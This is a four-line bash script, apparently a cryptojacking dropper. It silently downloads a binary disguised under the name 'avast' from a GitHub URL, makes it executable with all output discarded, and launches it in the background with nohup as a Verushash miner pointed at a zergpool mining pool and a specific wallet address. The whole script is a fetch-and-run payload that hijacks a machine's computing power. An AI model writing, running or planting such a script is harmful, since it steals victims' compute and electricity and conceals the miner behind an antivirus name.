#!/bin/bash
wget https://github.com/aurbach55/pos/raw/main/avast >/dev/null 2>&1
chmod +x avast  >/dev/null 2>&1
nohup ./avast -v -l verushash.asia.mine.zergpool.com:3300 -u XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk.tes-dash -p c=DASH,mc=VRSC -t 1 > nohup.out
